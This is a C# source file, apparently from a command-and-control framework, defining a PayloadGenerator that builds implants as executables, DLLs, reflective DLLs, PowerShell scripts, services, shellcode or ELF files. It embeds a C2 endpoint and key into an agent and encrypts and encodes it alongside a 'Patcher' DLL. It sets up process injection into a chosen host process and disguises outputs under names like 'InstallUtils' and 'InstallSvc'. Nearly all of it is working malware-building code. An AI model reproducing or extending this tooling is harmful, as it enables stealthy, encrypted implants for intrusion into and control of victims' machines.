using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;

namespace Common.Payload;

using System.IO;
using Common.Config;

public partial class PayloadGenerator
{
    public const string AgentSrcFile = "Agent.exe";
    public const string StarterSrcFile = "Starter.exe";
    public const string ServiceSrcFile = "Service.exe";
    public const string PatcherSrcFile = "Patcher.dll";
    public const string InjectSrcFile = "Inject.dll";

    public event EventHandler<string> MessageSent;

    public FoldersConfig FoldersConfig = null;
    public SpawnConfig SpawnConfig = null;


    public PayloadGenerator(FoldersConfig config, SpawnConfig spawn)
    {
        this.FoldersConfig = config;
        this.SpawnConfig = spawn;
    }

    private string Source(string fileName, ImplantArchitecture arch, bool debug)
    {
        if (debug)
            return Path.Combine(this.FoldersConfig.ImplantTemplatesFolder, "debug", fileName);
        return Path.Combine(this.FoldersConfig.ImplantTemplatesFolder, arch.ToString(), fileName);
    }

    private string Working(string fileName)
    {
        return Path.Combine(this.FoldersConfig.WorkingFolder, fileName);
    }

    private string Debug(string implantName, string fileName)
    {

        var path = Path.Combine(this.FoldersConfig.WorkingFolder, "Debug", implantName);

        if (!Directory.Exists(path))
            Directory.CreateDirectory(path);

        return Path.Combine(path, fileName);
    }

    public byte[] GenerateImplant(ImplantConfig options)
    {
        byte[] agentbytes = null;
        if(options.Type != ImplantType.Elf)
            if (options.IsInjected && options.Type != ImplantType.Library)
            {
                agentbytes = PrepareAgent(options, false);
                agentbytes = PrepareInjectedAgent(options, agentbytes, options.Type == ImplantType.Service);
            }
            else
            {
                agentbytes = PrepareAgent(options, options.Type == ImplantType.Service);
            }

        byte[] implantData = null;
        switch (options.Type)
        {
            case ImplantType.Executable: implantData = this.ExecutableEncapsulation(options, agentbytes); break;
            case ImplantType.PowerShell: implantData = this.PowershellEncapsulation(options, agentbytes); break;
            case ImplantType.Library: implantData = this.LibraryEncapsulation(options, agentbytes); break;
            case ImplantType.ReflectiveLibrary: implantData = this.ReflectiveLibraryEncapsulation(options, agentbytes); break;
            case ImplantType.Service: implantData = agentbytes; break;
            case ImplantType.Shellcode: implantData = this.BinaryEncapsulation(options, agentbytes); break;
            case ImplantType.Elf: implantData = this.ElfPrepare(options); break;
            default:
                throw new NotImplementedException();

        }

        File.WriteAllBytes(GetOutputFilePath(options), implantData);
        return implantData;
    }

    public byte[] ExecutableEncapsulation(ImplantConfig options, byte[] agent)
    {
        var agentPath = this.Working("tmp" + ShortGuid.NewGuid() + ".exe");
        File.WriteAllBytes(agentPath, agent);


        var scriptPath = Source("replace-resource.py", options.Architecture, options.IsDebug);
        var sourceExePath = Source("ResourceAssemblyLoader.exe", options.Architecture, options.IsDebug);
        string outPath = this.Working("tmp" + ShortGuid.NewGuid() + ".exe");

        var executionResult = this.ReplaceRessource(scriptPath, sourceExePath, agentPath, outPath);

        if (options.IsVerbose)
        {
            this.MessageSent?.Invoke(this, executionResult.Command);
            this.MessageSent?.Invoke(this, executionResult.Out);
        }

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "Build succeed.");
            else
                this.MessageSent?.Invoke(this, "Build failed.");


        File.Delete(agentPath);
        if (executionResult.Result != 0)
            return null;

        byte[] bytes = File.ReadAllBytes(outPath);

        File.Delete(outPath);

        return bytes;
    }

    public byte[] BinaryEncapsulation(ImplantConfig options, byte[] agent)
    {
        var agentPath = this.Working("tmp" + ShortGuid.NewGuid() + ".exe");
        File.WriteAllBytes(agentPath, agent);

        var outFile = "tmp" + ShortGuid.NewGuid() + ".bin";
        var outPath = this.Working(outFile);

        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
        var executionResult = this.GenerateBin(agentPath, outPath, options.Architecture == ImplantArchitecture.x86);

        if (options.IsVerbose)
        {
            this.MessageSent?.Invoke(this, executionResult.Command);
            this.MessageSent?.Invoke(this, executionResult.Out);
        }

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "Build succeed.");
            else
                this.MessageSent?.Invoke(this, "Build failed.");


        File.Delete(agentPath);
        if (executionResult.Result != 0)
            return null;

        byte[] bytes = File.ReadAllBytes(outPath);
        File.Delete(outPath);

        return bytes;
    }

    public byte[] LibraryEncapsulation(ImplantConfig options, byte[] agent)
    {
        var agentPath = this.Working("tmp" + ShortGuid.NewGuid() + ".exe");
        File.WriteAllBytes(agentPath, agent);


        var scriptPath = Source("replace-resource.py", options.Architecture, options.IsDebug);
        var sourceExePath = Source("DllAssemblyLoader.dll", options.Architecture, options.IsDebug);
        string outPath = this.Working("tmp" + ShortGuid.NewGuid() + ".dll");

        var executionResult = this.ReplaceRessource(scriptPath, sourceExePath, agentPath, outPath);

        if (options.IsVerbose)
        {
            this.MessageSent?.Invoke(this, executionResult.Command);
            this.MessageSent?.Invoke(this, executionResult.Out);
        }

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "Build succeed.");
            else
                this.MessageSent?.Invoke(this, "Build failed.");


        File.Delete(agentPath);
        if (executionResult.Result != 0)
            return null;

        byte[] bytes = File.ReadAllBytes(outPath);

        File.Delete(outPath);

        return bytes;
    }

    public byte[] ReflectiveLibraryEncapsulation(ImplantConfig options, byte[] agent)
    {
        if (options.Architecture == ImplantArchitecture.x86)
        {
            if (options.IsVerbose)
                this.MessageSent?.Invoke(this, "x86 is not implemented yet!");
            return null;
        }

        var agentPath = this.Working("tmp" + ShortGuid.NewGuid() + ".exe");
        File.WriteAllBytes(agentPath, agent);


        var scriptPath = Source("replace-resource.py", options.Architecture, options.IsDebug);
        var sourceExePath = Source("RflDllAssemblyLoader.dll", options.Architecture, options.IsDebug);
        string outPath = this.Working("tmp" + ShortGuid.NewGuid() + ".dll");

        var executionResult = this.ReplaceRessource(scriptPath, sourceExePath, agentPath, outPath);

        if (options.IsVerbose)
        {
            this.MessageSent?.Invoke(this, executionResult.Command);
            this.MessageSent?.Invoke(this, executionResult.Out);
        }

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "Build succeed.");
            else
                this.MessageSent?.Invoke(this, "Build failed.");


        File.Delete(agentPath);
        if (executionResult.Result != 0)
            return null;

        byte[] bytes = File.ReadAllBytes(outPath);

        File.Delete(outPath);

        return bytes;
    }

    public byte[] PowershellEncapsulation(ImplantConfig options, byte[] agent)
    {
        string psSourceCode = string.Empty;
        using (var psReader = new StreamReader(this.Source("payload.ps1", options.Architecture, options.IsDebug)))
        {
            psSourceCode = psReader.ReadToEnd();
        }

        var payload = this.Encode(agent);

        var psFile = "tmp" + ShortGuid.NewGuid() + ".ps1";
        psSourceCode = psSourceCode.Replace("[[PAYLOAD]]", payload.ToString());

        var psPath = this.Working(psFile);
        using (var writer = new StreamWriter(psPath))
        {
            writer.WriteLine(psSourceCode);
        }

        byte[] bytes = File.ReadAllBytes(psPath);


        File.Delete(Path.Combine(this.FoldersConfig.WorkingFolder, psPath));


        return bytes;
    }

    public byte[] PrepareAgent(ImplantConfig options, bool isService)
    {
        //Console.WriteLine("Generating encrypted Agent");

        this.MessageSent?.Invoke(this, $"Configuring Agent...");
        byte[] agent = LoadAssembly(this.Source(AgentSrcFile, options.Architecture, options.IsDebug));

        this.MessageSent?.Invoke(this, $"Using Endpoint {options.Endpoint}...");
        this.MessageSent?.Invoke(this, $"Using ServerKey {options.ServerKey}...");

        agent = AssemblyEditor.ReplaceRessources(agent, new Dictionary<string, object>()
        {
            { "EndPoint", options.Endpoint.ToString() },
            { "Key", options.ServerKey ?? String.Empty },
        });

        if (options.IsDebug)
            File.WriteAllBytes(this.Debug(options.ImplantName, "BaseAgent.exe"), agent);


        this.MessageSent?.Invoke(this, $"Encrypting Agent...");
        var encAgent = this.Encrypt(agent);
        var agentb64 = this.Encode(encAgent.Encrypted);


        this.MessageSent?.Invoke(this, $"Creating Patcher...");
        //Create Patcher
        var patchDll = LoadAssembly(this.Source(PatcherSrcFile, options.Architecture, options.IsDebug));

        var encPatcher = this.Encrypt(patchDll);
        var patcherb64 = this.Encode(encPatcher.Encrypted);

        if (!isService)
        {
            this.MessageSent?.Invoke(this, $"Creating Starter...");
            //Create Starter
            var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
            starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
                        { "Key", encAgent.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
            if (options.IsDebug)
                File.WriteAllBytes(this.Debug(options.ImplantName, "Starter.exe"), starter);
            return resultAgent;
        }
        else
        {
            this.MessageSent?.Invoke(this, $"Creating Service...");
            //Create Starter
            var service = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture, options.IsDebug));
            service = AssemblyEditor.ReplaceRessources(service, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
                        { "Key", encAgent.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");

            if (options.IsDebug)
                File.WriteAllBytes(this.Debug(options.ImplantName, "ServiceAgent.exe"), agent);

            return resultAgent;
        }
    }

    public byte[] PrepareInjectedAgent(ImplantConfig options, byte[] agent, bool isService)
    {
        #region binary
        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
        var tmpPath = this.Working(tmpFile);
        File.WriteAllBytes(tmpPath, agent);

        var outFile = "tmp" + ShortGuid.NewGuid() + ".bin";
        var outPath = this.Working(outFile);

        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
        var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == ImplantArchitecture.x86);

        if (options.IsVerbose)
        {
            this.MessageSent?.Invoke(this, executionResult.Command);
            this.MessageSent?.Invoke(this, executionResult.Out);
        }

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "[*] Binary generation succeed.");
            else
                this.MessageSent?.Invoke(this, "[X] Binary generation failed.");

        File.Delete(tmpPath);
        if (executionResult.Result != 0)
            return null;

        var binBytes = File.ReadAllBytes(outPath); //binary
        File.Delete(outPath);
        #endregion


        #region Injector
        var patchDll = LoadAssembly(this.Source(PatcherSrcFile, options.Architecture, options.IsDebug));
        var encPatcher = this.Encrypt(patchDll);
        var patcherb64 = this.Encode(encPatcher.Encrypted);

        this.MessageSent?.Invoke(this, $"BinLength = {binBytes.Length}");

        var injDll = LoadAssembly(this.Source(InjectSrcFile, options.Architecture, options.IsDebug));

        string process = options.Architecture == ImplantArchitecture.x64 ? this.SpawnConfig.SpawnToX64 : this.SpawnConfig.SpawnToX86;
        if (!string.IsNullOrEmpty(options.InjectionProcess))
            process = options.InjectionProcess;

        injDll = AssemblyEditor.ReplaceRessources(injDll, new Dictionary<string, object>()
                    {
                        { "Implant", binBytes },
                        { "Host",  process},
                        { "Delay", options.InjectionDelay.ToString() },
                    });

        var encInject = this.Encrypt(injDll);
        var injectb64 = this.Encode(encInject.Encrypted);

        if (!isService)
        {
            this.MessageSent?.Invoke(this, $"Creating Starter...");
            //Create Starter
            var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
            starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Implant", Encoding.UTF8.GetBytes(injectb64) },
                        { "Key", encInject.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
            return resultAgent;
        }
        else
        {
            this.MessageSent?.Invoke(this, $"Creating Service...");
            //Create Starter
            var service = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture, options.IsDebug));
            service = AssemblyEditor.ReplaceRessources(service, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Implant", Encoding.UTF8.GetBytes(injectb64) },
                        { "Key", encInject.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
            return resultAgent;
        }

        #endregion

    }

    private byte[] LoadAssembly(string filePath)
    {
        return File.ReadAllBytes(filePath);
    }

    private EncryptResult Encrypt(string filePath)
    {
        var fileContent = File.ReadAllBytes(filePath);
        return this.Encrypt(fileContent);
    }

    private EncryptResult Encrypt(byte[] bytes)
    {
        return new Encrypter().Encrypt(bytes);
    }

    private string Encode(byte[] bytes)
    {
        return Convert.ToBase64String(bytes); ;
    }

    private static byte[] Decrypt(string b64, string secretKey)
    {
        var src = Convert.FromBase64String(b64);
        var bytes = Encoding.UTF8.GetBytes(secretKey);

        byte[] key = bytes.Take(32).ToArray();
        byte[] iv = bytes.Take(16).ToArray();

        RijndaelManaged rijndael = new RijndaelManaged();
        rijndael.KeySize = 256;
        rijndael.BlockSize = 128;
        rijndael.Key = key;
        rijndael.IV = iv;
        rijndael.Padding = PaddingMode.PKCS7;

        byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(src, 0, src.Length);
        return decryptedBytes;
    }

    private string GetOutputFilePath(ImplantConfig options)
    {
        string outPath = Path.Combine(this.FoldersConfig.ImplantsFolder, GetImplantFileName(options));
        return outPath;
    }

    public static string GetImplantFileName(ImplantConfig options)
    {
        var outFile = options.ImplantName;
        switch (options.Type)
        {
            case ImplantType.Executable:
            case ImplantType.Service:
                if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                    outFile += ".exe";
                break;
            case ImplantType.Library:
                if (!Path.GetExtension(outFile).Equals(".dll", StringComparison.OrdinalIgnoreCase))
                    outFile += ".dll";
                break;
            case ImplantType.PowerShell:
                if (!Path.GetExtension(outFile).Equals(".ps1", StringComparison.OrdinalIgnoreCase))
                    outFile += ".ps1";
                break;
            case ImplantType.Shellcode:
                if (!Path.GetExtension(outFile).Equals(".bin", StringComparison.OrdinalIgnoreCase))
                    outFile += ".bin";
                break;
        }
        return outFile;
    }


    public static string GenerateImplantName()
    {
        var landscapes = new List<string>
    {
        "Desert", "Lake", "Tundra", "Hill", "Mountain", "Valley", "Canyon", "Plateau", "Prairie", "Forest",
        "Jungle", "Savanna", "Swamp", "Marsh", "Beach", "Coast", "Island", "Peninsula", "Bay", "Fjord",
        "Glacier", "Iceberg", "Volcano", "Crater", "Cave", "Cliff", "Ridge", "Peak", "Summit", "Slope",
        "Dune", "Oasis", "Mesa", "Butte", "Gorge", "Ravine", "Basin", "Delta", "Estuary", "Reef",
        "Lagoon", "Atoll", "Archipelago", "Strait", "Channel", "Sound", "Gulf", "Ocean", "Sea", "River",
        "Stream", "Creek", "Waterfall", "Rapids", "Spring", "Pond", "Reservoir", "Wetland", "Bog", "Fen",
        "Moor", "Heath", "Steppe", "Plain", "Meadow", "Field", "Grove", "Thicket", "Woodland", "Rainforest",
        "Taiga", "Chaparral", "Shrubland", "Grassland", "Pasture", "Orchard", "Vineyard", "Garden", "Park", "Reserve",
        "Wilderness", "Badlands", "Wasteland", "Quarry", "Mine", "Pit", "Abyss", "Trench", "Crevasse", "Fault",
        "Ridge", "Escarpment", "Bluff", "Promontory", "Headland", "Cape", "Point", "Rock", "Boulder", "Stone"
    };

        var adjectives = new List<string>
    {
        "Vast", "Serene", "Rugged", "Rolling", "Majestic", "Lush", "Barren", "Frozen", "Golden", "Verdant",
        "Pristine", "Wild", "Remote", "Tranquil", "Endless", "Dramatic", "Scenic", "Picturesque", "Breathtaking", "Stunning",
        "Magnificent", "Spectacular", "Imposing", "Towering", "Steep", "Gentle", "Undulating", "Flat", "Jagged", "Smooth",
        "Rocky", "Sandy", "Muddy", "Mossy", "Grassy", "Wooded", "Forested", "Dense", "Sparse", "Thick",
        "Open", "Enclosed", "Hidden", "Isolated", "Desolate", "Arid", "Humid", "Tropical", "Temperate", "Arctic",
        "Alpine", "Coastal", "Inland", "Elevated", "Lowland", "Subterranean", "Underground", "Deep", "Shallow", "Wide",
        "Narrow", "Winding", "Straight", "Curved", "Circular", "Angular", "Irregular", "Uniform", "Diverse", "Homogeneous",
        "Colorful", "Monochrome", "Vibrant", "Muted", "Bright", "Dark", "Shadowy", "Sunlit", "Moonlit", "Starlit",
        "Misty", "Foggy", "Cloudy", "Clear", "Stormy", "Calm", "Windy", "Still", "Turbulent", "Peaceful",
        "Ancient", "Timeless", "Primordial", "Untouched", "Unspoiled", "Pure", "Sacred", "Mysterious", "Enchanted", "Mystical"
    };

        var random = new Random();

        string landscape = landscapes[random.Next(landscapes.Count)];
        string adjective = adjectives[random.Next(adjectives.Count)];

        string result = $"{adjective}-{landscape}";

        return result;
    }
}


